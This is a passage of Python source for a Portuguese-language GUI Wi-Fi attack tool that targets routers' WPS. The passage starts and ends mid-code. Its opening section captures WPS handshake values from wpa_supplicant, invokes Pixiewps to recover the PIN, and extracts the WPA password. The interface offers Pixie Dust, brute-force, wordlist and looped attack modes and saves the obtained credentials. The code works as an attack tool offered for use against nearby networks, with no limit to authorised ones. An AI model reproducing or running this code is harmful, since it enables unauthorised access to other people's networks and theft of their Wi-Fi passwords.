            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                self.log('[-] WSC NACK Recebido. PIN Incorreto', 'e')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                if pixiemode: self.log('E-Nonce: {}'.format(self.pixie_creds.e_nonce))
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                if pixiemode: self.log('PKR: {}'.format(self.pixie_creds.pkr))
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                if pixiemode: self.log('PKE: {}'.format(self.pixie_creds.pke))
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                if pixiemode: self.log('AuthKey: {}'.format(self.pixie_creds.authkey))
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                if pixiemode: self.log('E-Hash1: {}'.format(self.pixie_creds.e_hash1))
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                if pixiemode: self.log('E-Hash2: {}'.format(self.pixie_creds.e_hash2))
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
        elif ': State: ' in line and '-> SCANNING' in line:
            self.connection_status.status = 'scanning'
            self.log('Varrendo canais...')
        elif ('WPS-FAIL' in line) and self.connection_status.status != '':
            self.connection_status.status = 'WPS_FAIL'
            self.log('WPS-FAIL retornado do wpa_supplicant', 'e')
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                try:
                    self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
                except Exception: pass
            self.log('Autenticando contra o AP...')
        elif 'Authentication response' in line: self.log('Fase de Autenticação Concluída')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                try:
                    self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
                except Exception: pass
            self.log('Associando...')
        elif ('Associated with' in line) and self.interface in line:
            bssid_found = line.split()[-1].upper()
            if self.connection_status.essid:
                self.log('Associado com {} (ESSID: {})'.format(bssid_found, self.connection_status.essid), 's')
            else: self.log('Associado com {}'.format(bssid_found), 's')
            self.connection_status.status = 'associated'
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            self.log('Iniciando handshake EAPOL...')
        elif 'EAP entering state IDENTITY' in line: self.log('Recebido EAP-Request Identity')
        elif 'using real identity' in line: self.log('Respondendo EAP-Response Identity...')
        elif self.bssid in line and 'level=' in line:
            try: self.lastPwr = line.split("level=")[1].split(" ")[0]
            except IndexError: pass
        elif pbc_mode and 'selected BSS ' in line:
            try:
                bssid_found = line.split('selected BSS ')[-1].split()[0].upper()
                self.connection_status.bssid = bssid_found
                self.log('Aparelho selecionou o BSSID: {}'.format(bssid_found))
            except IndexError: pass
        elif bssid in line and 'level=' in line:
            try:
                signal = line.split("level=")[1].split(" ")[0]
                noise = line.split("noise=")[1].split(" ")[0] if 'noise=' in line else ''
                if noise: self.log('Sinal: {} dBm (Ruído: {})'.format(signal, noise))
                else: self.log('Sinal: {} dBm'.format(signal))
            except IndexError: pass
        return True

    def _runPixiewps(self, showcmd=False, full_range=False):
        self.log('Invocando Pixiewps...')
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd: self.log(cmd)
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=sys.stdout, encoding='utf-8', errors='replace')
        self.log(r.stdout)
        if r.returncode == 0:
            for line in r.stdout.splitlines():
                if '[+]' in line and 'WPS pin' in line:
                    pin = line.split(':')[-1].strip()
                    return "''" if pin == '<empty>' else pin
        return False

    def _wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=True):
        self.pixie_creds.clear()
        self.connection_status.clear()
        self.wpas.stdout.read(300)
        if pbc_mode:
            cmd = 'WPS_PBC {}'.format(bssid) if bssid else 'WPS_PBC'
            self.log("Conectando via WPS PBC...")
        else:
            cmd = 'WPS_REG {} {}'.format(bssid, pin)
            self.log("Testando PIN '{}'...".format(pin))
        r = self.sendAndReceive(cmd)
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            self.log(self._explain_wpas_not_ok_status(cmd, r), 'e')
            return False
        while self._running:
            res = self._handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose, bssid=bssid.lower())
            if not res or self.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                break
        self.sendOnly('WPS_CANCEL')
        return False

    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False,
                          showpixiecmd=False, pixieforce=False):
        if not IS_LINUX: return None
        if not pin:
            if pixiemode:
                try:
                    with open('{}{}.run'.format(self.pixiewps_dir, bssid.replace(':','').upper()), 'r') as f:
                        pin = f.readline().strip()
                        self.log('PIN anterior encontrado: {}'.format(pin))
                except Exception: pin = self.generator.getLikely(bssid) or '12345670'
            elif not pbc_mode:
                self.log('Nenhum PIN especificado, usando PIN provável')
                pin = self.generator.getLikely(bssid) or '12345670'
        if pbc_mode:
            self._wps_connection(bssid, pbc_mode=pbc_mode)
            bssid = getattr(self.connection_status, 'bssid', bssid)
            pin = '<PBC mode>'
        else:
            self._wps_connection(bssid, pin, pixiemode)
        if self.connection_status.status == 'GOT_PSK':
            result = {'pin': pin, 'psk': self.connection_status.wpa_psk,
                      'essid': self.connection_status.essid, 'bssid': bssid}
            self.log('=' * 50, 's')
            self.log('[+] WPS PIN ENCONTRADO: {}'.format(pin), 's')
            self.log('[+] SENHA WPA PSK: {}'.format(self.connection_status.wpa_psk), 's')
            self.log('[+] SSID (Nome): {}'.format(self.connection_status.essid), 's')
            self.log('=' * 50, 's')
            return result
        elif pixiemode and self.pixie_creds.got_all():
            pin_found = self._runPixiewps(showpixiecmd, pixieforce)
            if pin_found:
                self.log('[+] PIN descoberto pelo Pixie Dust: {}'.format(pin_found), 's')
                return self.single_connection(bssid, pin_found, pixiemode=False, showpixiecmd=showpixiecmd, pixieforce=pixieforce)
            return None
        return None

    def generate_pins_list(self, bssid): return self.generator.getSuggested(bssid)

    def cleanup(self):
        try:
            self._running = False
            if IS_LINUX:
                self.retsock.close()
                if hasattr(self, 'wpas') and self.wpas: self.wpas.terminate()
                if os.path.exists(self.res_socket_file): os.remove(self.res_socket_file)
                shutil.rmtree(self.tempdir, ignore_errors=True)
                if os.path.exists(self.tempconf): os.remove(self.tempconf)
        except Exception: pass

    def __del__(self):
        try: self.cleanup()
        except Exception: pass

# ============================================================
# INTERFACE GRÁFICA GERAL COM SISTEMA DE ABAS (ttk.Notebook)
# ============================================================
class OneShotGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("WPS Attack Pin Kali Linux Windows WiFi Scanner v2")
        self.root.geometry("1150x820")
        
        if IS_WINDOWS:
            try: self.root.state("zoomed")
            except Exception: pass
        elif IS_LINUX:
            try: self.root.attributes("-zoomed", True)
            except Exception: pass

        self.root.minsize(980, 720)
        self.root.configure(bg=BG_MAIN)

        self.companion = None
        self.scanner = None
        self.attack_thread = None
        self.scan_thread = None
        self._running = False
        self._scanning = False
        self.networks_list = []
        self.selected_bssid = None
        self.generator = WPSpin()
        self.wordlist_pins = []
        self.wordlist_index = 0
        self.reports_dir = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'reports')
        if not os.path.exists(self.reports_dir): os.makedirs(self.reports_dir)

        self.var_interface = tk.StringVar(value='wlan0')
        self.var_pin = tk.StringVar()
        self.var_delay = tk.StringVar(value='0')
        self.var_save = tk.BooleanVar(value=True)
        self.var_pixie = tk.BooleanVar(value=True)
        self.var_bruteforce = tk.BooleanVar(value=False)
        self.var_pbc = tk.BooleanVar(value=False)
        self.var_verbose = tk.BooleanVar(value=False)
        self.var_pixie_force = tk.BooleanVar(value=False)
        self.var_show_cmd = tk.BooleanVar(value=False)
        self.var_loop = tk.BooleanVar(value=False)
        self.var_wordlist = tk.BooleanVar(value=False)

        self.log_queue = queue.Queue()
        self.scan_queue = queue.Queue()
        self.result_queue = queue.Queue()

        self.win_networks = []
        self.win_filtered_networks = []

        self._setup_global_styles()
        self._build_main_ui()
        
        self.root.after(100, self._poll_queues)
        self.root.after(300, self._auto_run_initial_checks)

    def _setup_global_styles(self):
        style = ttk.Style()
        style.theme_use('clam')

        style.configure('.', background=BG_MAIN, foreground=GREEN_BRIGHT,
            fieldbackground=BG_ENTRY, troughcolor=BG_MAIN,
            selectbackground=GREEN_SELECT, selectforeground='#ffffff',
            font=('Consolas', 10))

        style.configure('TFrame', background=BG_MAIN)
        style.configure('TNotebook', background=BG_MAIN, borderwidth=0)
        style.configure('TNotebook.Tab',
            background=BG_PANEL, foreground=GREEN_PRIMARY,
            borderwidth=1, bordercolor=GREEN_DIM, padding=(15, 6),
            font=('Consolas', 10, 'bold'))
        style.map('TNotebook.Tab',
            background=[('selected', BG_MAIN), ('active', BG_PANEL)],
            foreground=[('selected', GREEN_BRIGHT), ('active', GREEN_BRIGHT)])

        style.configure('TLabelframe', background=BG_MAIN, foreground=GREEN_BRIGHT, bordercolor=GREEN_DIM)
        style.configure('TLabelframe.Label', background=BG_MAIN, foreground=GREEN_BRIGHT,
                        font=('Consolas', 10, 'bold'))
        
        style.configure('TLabel', background=BG_MAIN, foreground=GREEN_PRIMARY)
        style.configure('TEntry', fieldbackground=BG_ENTRY, foreground=GREEN_BRIGHT,
                        insertcolor=GREEN_BRIGHT, bordercolor=GREEN_DIM)
        style.map('TEntry', bordercolor=[('focus', GREEN_BRIGHT)])

        style.configure('TButton', background=BG_PANEL, foreground=GREEN_BRIGHT,
                        bordercolor=GREEN_DIM, relief=tk.FLAT, borderwidth=1)
        style.map('TButton',
            background=[('active', GREEN_SELECT), ('disabled', '#050a05')],
            foreground=[('active', '#ffffff'), ('disabled', '#005510')],
            bordercolor=[('active', GREEN_BRIGHT)])

        style.configure('TCheckbutton', background=BG_MAIN, foreground=GREEN_PRIMARY)
        style.map('TCheckbutton',
            background=[('active', BG_MAIN)],
            foreground=[('active', GREEN_BRIGHT)])

        style.configure('Treeview', background=BG_MAIN, foreground=TEXT_LIGHT,
                        fieldbackground=BG_MAIN, bordercolor=GREEN_DIM, relief=tk.FLAT, rowheight=26)
        style.map('Treeview',
            background=[('selected', GREEN_SELECT)],
            foreground=[('selected', '#ffffff')])
        
        style.configure('Treeview.Heading', background=BG_PANEL, foreground=GREEN_BRIGHT,
                        fieldbackground=BG_PANEL, bordercolor=GREEN_DIM, relief=tk.FLAT, font=('Consolas', 9, 'bold'))
        style.map('Treeview.Heading', background=[('active', GREEN_SELECT)])

        style.configure('Vertical.TScrollbar', background=BG_PANEL, troughcolor=BG_MAIN,
                        bordercolor=BG_MAIN, arrowcolor=GREEN_PRIMARY)
        style.configure('Horizontal.TScrollbar', background=BG_PANEL, troughcolor=BG_MAIN,
                        bordercolor=BG_MAIN, arrowcolor=GREEN_PRIMARY)

    def _build_main_ui(self):
        menubar = tk.Menu(self.root, bg=BG_PANEL, fg=GREEN_PRIMARY,
                          activebackground=GREEN_SELECT, activeforeground='#ffffff', borderwidth=0)
        file_menu = tk.Menu(menubar, tearoff=0, bg=BG_PANEL, fg=GREEN_PRIMARY,
                           activebackground=GREEN_SELECT, activeforeground='#ffffff', borderwidth=0)
        file_menu.add_command(label='Carregar Wordlist WPS...', command=self._load_wordlist)
        file_menu.add_separator()
        file_menu.add_command(label='Exportar Histórico local (.csv)', command=self._export_stored_csv)
        file_menu.add_separator()
        file_menu.add_command(label='Sair', command=self._on_close)
        menubar.add_cascade(label='Arquivo', menu=file_menu)

        tools_menu = tk.Menu(menubar, tearoff=0, bg=BG_PANEL, fg=GREEN_PRIMARY,
                            activebackground=GREEN_SELECT, activeforeground='#ffffff', borderwidth=0)
        tools_menu.add_command(label='Gerador Manual de PIN WPS', command=self._manual_pin_gen)
        tools_menu.add_command(label='Limpar logs locais', command=self._clear_log)
        menubar.add_cascade(label='Ferramentas', menu=tools_menu)

        about_menu = tk.Menu(menubar, tearoff=0, bg=BG_PANEL, fg=GREEN_PRIMARY,
                            activebackground=GREEN_SELECT, activeforeground='#ffffff', borderwidth=0)
        about_menu.add_command(label='Sobre a Suíte', command=self._show_about)
        menubar.add_cascade(label='Ajuda', menu=about_menu)
        self.root.config(menu=menubar)

        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True)

        self.tab_wps = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_wps, text="  WPS ATTACK (LINUX)  ")
        self._build_tab_wps()

        self.tab_win_scan = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_win_scan, text="  WINDOWS SCANNER (NETSH)  ")
        self._build_tab_windows_scanner()

        self.status_bar = tk.Label(self.root, text='Painel inicializado. Pronto para auditoria.', relief=tk.FLAT, anchor=tk.W,
                                   bg=GREEN_DIM, fg="#000000", font=('Consolas', 9, 'bold'),
                                   borderwidth=1, highlightbackground=BG_MAIN)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)

    def _build_tab_wps(self):
        wps_main = ttk.Frame(self.tab_wps, padding=10)
        wps_main.pack(fill=tk.BOTH, expand=True)

        control_frame = ttk.LabelFrame(wps_main, text='Parâmetros de Auditoria / Conectividade', padding=10)
        control_frame.pack(fill=tk.X, pady=(0, 5))

        ttk.Label(control_frame, text='Interface:').grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
        self.entry_iface = ttk.Entry(control_frame, textvariable=self.var_interface, width=15)
        self.entry_iface.grid(row=0, column=1, sticky=tk.W, padx=5, pady=2)        
        
        ttk.Style().configure("DarkGreen.TButton", background="#006400", foreground="white", font=("Arial", 10, "bold"))
        self.btn_scan = ttk.Button(control_frame, text="[ Escanear WPS ]", command=self._scan_networks, style="DarkGreen.TButton")
        self.btn_scan.grid(row=0, column=2, padx=5, pady=2)

        ttk.Style().configure("Red.TButton", background="#FF0000", foreground="white", font=("Arial", 10, "bold"))
        self.btn_stop = ttk.Button(control_frame, text="Parar", command=self._stop_attack, state=tk.DISABLED, style="Red.TButton")
        self.btn_stop.grid(row=0, column=3, padx=5)
        
        self.lbl_os = ttk.Label(control_frame, text='[LINUX - Full Auditor]', foreground=CYAN)
        self.lbl_os.grid(row=0, column=4, columnspan=2, sticky=tk.W, padx=15, pady=2)

        ttk.Label(control_frame, text='Modo WPS:').grid(row=1, column=0, sticky=tk.W, padx=5, pady=2)
        mode_frame = ttk.Frame(control_frame)
        mode_frame.grid(row=1, column=1, columnspan=5, sticky=tk.W, padx=5, pady=2)
        
        self.chk_pixie = ttk.Checkbutton(mode_frame, text='Pixie Dust', variable=self.var_pixie)
        self.chk_pixie.pack(side=tk.LEFT, padx=5)
        self.chk_brute = ttk.Checkbutton(mode_frame, text='Força Bruta', variable=self.var_bruteforce)
        self.chk_brute.pack(side=tk.LEFT, padx=5)
        self.chk_pbc = ttk.Checkbutton(mode_frame, text='Botão Físico (PBC)', variable=self.var_pbc)
        self.chk_pbc.pack(side=tk.LEFT, padx=5)
        self.chk_wordlist = ttk.Checkbutton(mode_frame, text='Usar Wordlist', variable=self.var_wordlist)
        self.chk_wordlist.pack(side=tk.LEFT, padx=5)

        ttk.Label(control_frame, text='PIN Alvo:').grid(row=2, column=0, sticky=tk.W, padx=5, pady=2)
        self.entry_pin = ttk.Entry(control_frame, textvariable=self.var_pin, width=15)
        self.entry_pin.grid(row=2, column=1, sticky=tk.W, padx=5, pady=2)
        
        ttk.Style().configure("Pumpkin.TButton", background="#FF8C00", foreground="black", font=("Arial", 10, "bold"))
        self.btn_wl = ttk.Button(control_frame, text="[ Selecionar Wordlist ]", command=self._load_wordlist, style="Pumpkin.TButton")
        self.btn_wl.grid(row=2, column=2, padx=5, pady=2)
        
        self.chk_save = ttk.Checkbutton(control_frame, text='Gravar credenciais obtidas', variable=self.var_save)
        self.chk_save.grid(row=2, column=3, columnspan=2, sticky=tk.W, padx=5, pady=2)

        ttk.Label(control_frame, text='Delay:').grid(row=2, column=5, sticky=tk.W, padx=5, pady=2)
        self.entry_delay = ttk.Entry(control_frame, textvariable=self.var_delay, width=6)
        self.entry_delay.grid(row=2, column=6, sticky=tk.W, padx=5, pady=2)

        ttk.Style().configure("GreenBlue.TButton", background="#07F72F", foreground="black", font=("Arial", 10, "bold"))
        self.btn_attack = ttk.Button(control_frame, text="[ INICIAR ATAQUE WPS ]", command=self._start_attack, style="GreenBlue.TButton")
        self.btn_attack.grid(row=3, column=0, columnspan=2, pady=8, sticky=tk.W+tk.E, padx=5)
        
        adv_frame = ttk.Frame(control_frame)
        adv_frame.grid(row=3, column=2, columnspan=4, sticky=tk.W, padx=5, pady=2)
        
        self.chk_verbose = ttk.Checkbutton(adv_frame, text='Modo Detalhado', variable=self.var_verbose)
        self.chk_verbose.pack(side=tk.LEFT, padx=5)
        self.chk_force = ttk.Checkbutton(adv_frame, text='Forçar Pixie Dust', variable=self.var_pixie_force)
        self.chk_force.pack(side=tk.LEFT, padx=5)
        self.chk_showcmd = ttk.Checkbutton(adv_frame, text='Revelar Comandos', variable=self.var_show_cmd)
        self.chk_showcmd.pack(side=tk.LEFT, padx=5)
        self.chk_loop = ttk.Checkbutton(adv_frame, text='Loop de Ataques', variable=self.var_loop)
        self.chk_loop.pack(side=tk.LEFT, padx=5)

        ttk.Button(control_frame, text='[ Gerar PIN Sugerido ]', command=self._manual_pin_gen).grid(row=3, column=6, padx=5, pady=2)

        table_frame = ttk.LabelFrame(wps_main, text='Redes com Vulnerabilidade WPS Detectadas', padding=5)
        table_frame.pack(fill=tk.BOTH, expand=True, pady=5)

        columns = ('bssid', 'essid', 'sec', 'pwr', 'pwr_bar', 'device', 'model', 'locked')
        self.tree = ttk.Treeview(table_frame, columns=columns, show='headings', selectmode='browse', height=7)
        self.tree.heading('bssid', text='BSSID (Endereço Físico)')
        self.tree.heading('essid', text='Nome da Rede (ESSID)')
        self.tree.heading('sec', text='Segurança')
        self.tree.heading('pwr', text='Sinal')
        self.tree.heading('pwr_bar', text='Força do Sinal')
        self.tree.heading('device', text='Dispositivo')
        self.tree.heading('model', text='Modelo')
        self.tree.heading('locked', text='Bloqueado')

        self.tree.column('bssid', width=140, minwidth=120, anchor=tk.CENTER)
        self.tree.column('essid', width=160, minwidth=100)
        self.tree.column('sec', width=110, minwidth=85)
        self.tree.column('pwr', width=70, minwidth=60, anchor=tk.CENTER)
        self.tree.column('pwr_bar', width=120, minwidth=80, anchor=tk.CENTER)
        self.tree.column('device', width=150, minwidth=100)
        self.tree.column('model', width=120, minwidth=80)
        self.tree.column('locked', width=80, minwidth=60, anchor=tk.CENTER)

        scroll_tree = ttk.Scrollbar(table_frame, orient=tk.VERTICAL, command=self.tree.yview)
        self.tree.configure(yscrollcommand=scroll_tree.set)
        scroll_tree.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree.pack(fill=tk.BOTH, expand=True)

        self.tree.tag_configure('excellent', background=BG_MAIN, foreground=GREEN_BRIGHT)
        self.tree.tag_configure('good', background=BG_MAIN, foreground=GREEN_PRIMARY)
        self.tree.tag_configure('fair', background=BG_MAIN, foreground=YELLOW)
        self.tree.tag_configure('weak', background=BG_MAIN, foreground=ORANGE)
        self.tree.tag_configure('poor', background=BG_MAIN, foreground=RED)
        self.tree.tag_configure('locked', background=BG_MAIN, foreground=RED, font=('Consolas', 9, 'bold'))
        self.tree.tag_configure('unlocked', background=BG_MAIN, foreground=GREEN_BRIGHT)

        self.tree.bind('<<TreeviewSelect>>', self._on_select_network)
        self.tree.bind('<Double-1>', lambda e: self._start_attack())        

        log_frame = ttk.LabelFrame(wps_main, text='Console / Terminal de Eventos', padding=5)
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)

        log_toolbar = ttk.Frame(log_frame)
        log_toolbar.pack(fill=tk.X, pady=(0, 4))
        
        ttk.Label(log_toolbar, text="> Eventos de Auditoria:", font=('Consolas', 9, 'bold'), foreground=GREEN_PRIMARY).pack(side=tk.LEFT, padx=5)
        
        btn_clear_console = ttk.Button(log_toolbar, text="[ LIMPAR CONSOLE ]", command=self._clear_log)
        btn_clear_console.pack(side=tk.RIGHT, padx=5)

        self.log_text = tk.Text(log_frame, height=10, font=('Consolas', 9),
                                 state=tk.DISABLED, wrap=tk.WORD,
                                 bg=BG_MAIN, fg=TEXT_LIGHT, relief=tk.FLAT,
                                 borderwidth=0, padx=5, pady=5,
                                 highlightthickness=0, insertbackground=GREEN_BRIGHT)
        scroll_log = ttk.Scrollbar(log_frame, orient=tk.VERTICAL, command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=scroll_log.set)
        scroll_log.pack(side=tk.RIGHT, fill=tk.Y)
        self.log_text.pack(fill=tk.BOTH, expand=True)

        self.log_text.tag_configure('info', foreground=GREEN_PRIMARY)
        self.log_text.tag_configure('success', foreground=GREEN_BRIGHT)
        self.log_text.tag_configure('error', foreground=RED)
        self.log_text.tag_configure('warning', foreground=YELLOW)
        self.log_text.tag_configure('debug', foreground='#6a9955')
        self.log_text.tag_configure('highlight', foreground=CYAN)
        self.log_text.tag_configure('timestamp', foreground=GREEN_DIM)
        
        self.log_text.tag_configure('con_ssid', foreground='#ffffff', font=('Consolas', 10, 'bold'))
        self.log_text.tag_configure('con_bssid', foreground=GREEN_PRIMARY)
        self.log_text.tag_configure('con_pin', foreground=CYAN, font=('Consolas', 11, 'bold'))
        self.log_text.tag_configure('con_key', foreground=GREEN_BRIGHT, font=('Consolas', 12, 'bold'), background='#072207')
        self.log_text.tag_configure('con_header', foreground=YELLOW, font=('Consolas', 10, 'bold'))

    def _build_tab_windows_scanner(self):
        win_main = ttk.Frame(self.tab_win_scan, padding=12)
        win_main.pack(fill=tk.BOTH, expand=True)

        header_frame = ttk.Frame(win_main)
        header_frame.pack(fill=tk.X, pady=(0, 8))

        ttk.Label(header_frame, text="> WINDOWS_NETSH_WIFI_SCANNER v2",
                  font=("Consolas", 15, "bold"), foreground=GREEN_BRIGHT).pack(side="left")

        sep = tk.Frame(win_main, bg=GREEN_DIM, height=1)
        sep.pack(fill="x", pady=(0, 10))

        ctrl_frame = ttk.Frame(win_main)
        ctrl_frame.pack(fill="x", pady=(0, 8))

        ttk.Style().configure("Green.TButton", background="#14F147", foreground="black", font=("Arial", 10, "bold"))
        ttk.Style().configure("Pumpkin.TButton", background="#FF8C00", foreground="black", font=("Arial", 10, "bold"))
        ttk.Style().configure("Blue.TButton", background="#0BE8F8", foreground="black", font=("Arial", 10, "bold"))

        ttk.Button(ctrl_frame, text="[ INICIAR SCAN (NETSH) ]", command=self.win_scan, style="Green.TButton").pack(side="left", padx=(0, 8))
        ttk.Button(ctrl_frame, text="[ EXPORTAR HTML ]", command=self.win_export_html, style="Pumpkin.TButton").pack(side="left", padx=(0, 8))
        ttk.Button(ctrl_frame, text="[ COPIAR SELECIONADO ]", command=self.win_copy_selected, style="Blue.TButton").pack(side="left", padx=(0, 8))
        ttk.Label(ctrl_frame, text="  FILTRAR BUSCA > ").pack(side="left")
        self.var_win_filter = tk.StringVar()
        self.var_win_filter.trace_add("write", lambda *_: self.win_apply_filter())
        
        entry_filter = ttk.Entry(ctrl_frame, textvariable=self.var_win_filter, width=32)
        entry_filter.pack(side="left", padx=5)

        self.win_stats_panel = tk.Frame(win_main, bg=BG_PANEL, highlightbackground=GREEN_DIM, highlightthickness=1)
        self.win_stats_panel.pack(fill="x", pady=(0, 10))

        self.win_var_total_ssids = tk.StringVar(value="REDES DISPONÍVEIS: 0")
        self.win_var_total_bssids = tk.StringVar(value="BSSIDs (PONTOS): 0")
        self.win_var_total_open = tk.StringVar(value="SEM SENHA (ABERTAS): 0")
        self.win_var_best_signal = tk.StringVar(value="MELHOR INTENSIDADE: --")

        for var in (self.win_var_total_ssids, self.win_var_total_bssids, self.win_var_total_open, self.win_var_best_signal):
            lbl = tk.Label(self.win_stats_panel, textvariable=var, bg=BG_PANEL, fg=GREEN_BRIGHT,
                           font=("Consolas", 10, "bold"), padx=15, pady=8)
            lbl.pack(side="left")

        table_frame = ttk.Frame(win_main)
        table_frame.pack(fill="both", expand=True)

        columns = ("rank", "ssid", "bssid", "signal", "radio", "channel", "auth", "crypto", "rates")
        self.win_tree = ttk.Treeview(table_frame, columns=columns, show="headings", selectmode="browse")

        headings = {
            "rank": "#", "ssid": "SSID / NOME REDE", "bssid": "BSSID (MAC)", "signal": "SINAL",
            "radio": "PADRÃO RÁDIO", "channel": "CANAL", "auth": "AUTENTICAÇÃO", "crypto": "CRIPTO", "rates": "TAXAS MÁXIMAS Mbps"
        }

        widths = {
            "rank": 45, "ssid": 180, "bssid": 140, "signal": 80, "radio": 110, "channel": 65, "auth": 110, "crypto": 95, "rates": 300
        }

        for col in columns:
            self.win_tree.heading(col, text=headings[col], command=lambda c=col: self.win_sort_by_column(c))
            self.win_tree.column(col, width=widths[col], minwidth=40, anchor="center" if col != "ssid" else "w")

        vsb = ttk.Scrollbar(table_frame, orient="vertical", command=self.win_tree.yview)
        hsb = ttk.Scrollbar(table_frame, orient="horizontal", command=self.win_tree.xview)
        self.win_tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)

        self.win_tree.grid(row=0, column=0, sticky="nsew")
        vsb.grid(row=0, column=1, sticky="ns")
        hsb.grid(row=1, column=0, sticky="ew")

        table_frame.rowconfigure(0, weight=1)
        table_frame.columnconfigure(0, weight=1)

        self.win_tree.bind("<<TreeviewSelect>>", self.win_show_details)

        self.win_tree.tag_configure("excellent", foreground=GREEN_BRIGHT)
        self.win_tree.tag_configure("good", foreground="#66ff66")
        self.win_tree.tag_configure("medium", foreground=YELLOW)
        self.win_tree.tag_configure("weak", foreground=ORANGE)
        self.win_tree.tag_configure("bad", foreground=RED)
        self.win_tree.tag_configure("open_network", foreground=CYAN)

        details_frame = tk.LabelFrame(win_main, text="[ DETALHES AVANÇADOS DA CÉLULA WI-FI ]",
                                     bg=BG_MAIN, fg=GREEN_BRIGHT, font=("Consolas", 9, "bold"),
                                     highlightbackground=GREEN_DIM, highlightthickness=1, padx=10, pady=6)
        details_frame.pack(fill="x", pady=(10, 0))

        self.win_var_details = tk.StringVar(value="> Selecione uma célula Wi-Fi acima para obter a telemetria detalhada...")
        tk.Label(details_frame, textvariable=self.win_var_details, bg=BG_MAIN, fg=TEXT_LIGHT,
                 justify="left", anchor="w", font=("Consolas", 9)).pack(fill="x")

    def log(self, msg, level='info'):
        self.log_queue.put((msg, level))

    def _process_log(self, msg, level):
        tag_map = {
            'i': 'info', 's': 'success', 'e': 'error', 'd': 'debug', 'w': 'warning',
            'info': 'info', 'success': 'success', 'error': 'error',
            'debug': 'debug', 'warning': 'warning', 'highlight': 'highlight',
            'con_ssid': 'con_ssid', 'con_bssid': 'con_bssid', 'con_pin': 'con_pin',
            'con_key': 'con_key', 'con_header': 'con_header'
        }
        tag = tag_map.get(level, 'info')
        try:
            self.log_text.config(state=tk.NORMAL)
            timestamp = datetime.now().strftime('%H:%M:%S')
            self.log_text.insert(tk.END, '[{}] '.format(timestamp), 'timestamp')
            self.log_text.insert(tk.END, '{}\n'.format(msg), tag)
            self.log_text.see(tk.END)
            self.log_text.config(state=tk.DISABLED)
            self.status_bar.config(text=msg[:100])
        except Exception: pass

    def _clear_log(self):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.delete(1.0, tk.END)
        self.log_text.config(state=tk.DISABLED)

    def _scan_networks(self):
        iface = self.var_interface.get().strip()
        if not iface:
            messagebox.showerror('Erro', 'Favor preencher o campo de interface para prosseguir.')
            return
        self.btn_scan.config(state=tk.DISABLED, text='Buscando APs...')
        self._clear_tree()
        self.networks_list = []
        self.scan_thread = threading.Thread(target=self._do_scan_tab1, args=(iface,), daemon=True)
        self.scan_thread.start()

    def _do_scan_tab1(self, iface):
        try:
            vuln_file = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'vulnwsc.txt')
            vuln_list = []
            if os.path.exists(vuln_file):
                try:
                    with open(vuln_file, 'r') as f: vuln_list = f.read().splitlines()
                except Exception: pass
            scanner = WiFiScanner(iface, vuln_list, callback_log=lambda m, l: self.log(m, l))
            networks = scanner.scan()
            self.scan_queue.put(networks)
        except Exception as e:
            self.scan_queue.put(('error', str(e)))

    def _process_scan_tab1(self, data):
        self.btn_scan.config(state=tk.NORMAL, text='[ Escanear WPS ]')
        if isinstance(data, tuple) and data[0] == 'error':
            self.log('Erro de Escaneamento: {}'.format(data[1]), 'error')
            return
        networks = data
        if not networks:
            self.log('Nenhuma rede com WPS ativo foi detectada na área.', 'warning')
            return
        self.networks_list = networks
        self._clear_tree()
        for net in networks:
            essid = net.get('ESSID', 'SSID_Oculto') or 'SSID_Oculto'
            bssid = net['BSSID']
            level = net.get('Level', 0)
            locked = net.get('WPS locked', False)
            
            try:
                dbm = int(level)
                if dbm >= -50: tag_signal = 'excellent'; pwr_bar = '████████████'
                elif dbm >= -60: tag_signal = 'good'; pwr_bar = '██████████'
                elif dbm >= -70: tag_signal = 'fair'; pwr_bar = '████████'
                elif dbm >= -80: tag_signal = 'weak'; pwr_bar = '██████'
                else: tag_signal = 'poor'; pwr_bar = '████'
            except Exception:
                tag_signal = 'fair'; pwr_bar = '?'
                
            locked_str = 'SIM' if locked else 'NÃO'
            locked_tag = 'locked' if locked else 'unlocked'
            
            self.tree.insert('', tk.END,
                values=(bssid, essid, net.get('Security type', '?'),
